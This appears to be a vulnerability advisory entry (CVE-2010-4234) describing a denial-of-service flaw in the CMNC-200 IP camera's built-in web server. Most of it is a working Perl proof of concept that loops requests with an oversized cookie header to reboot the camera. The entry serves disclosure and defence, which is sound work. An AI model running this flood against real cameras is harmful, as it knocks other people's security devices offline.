Finding 5: Camera Denial of Service
CVE: CVE-2010-4234

The CMNC-200 IP Camera has a built-in web server that
is vulnerable to denial of service attacks. Sending multiple
requests in parallel to the web server may cause the camera
to reboot.

Requests with long cookie header makes the IP camera reboot a few
seconds faster, however the same can be accomplished with requests
of any size.

The example code below is able to reboot the IP cameras in
less than a minute in a local network.

#!/usr/bin/perl

use LWP::UserAgent;

while (1 == 1){

$ua = new LWP::UserAgent;
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US;
rv:1.8.1.6)");

$req = HTTP::Request->new(GET => 'http://192.168.10.100');
$req->header(Accept =>
"text/xml,application/xml,application/xhtml+xml,text/html
;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5");
$req->header("Keep-Alive" => 0);
$req->header(Connection => "close");
$req->header("If-Modified-Since" => "Mon, 12 Oct 2009
02:06:34 GMT");
$req->header(Cookie =>
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
my $res = $ua->request($req);

}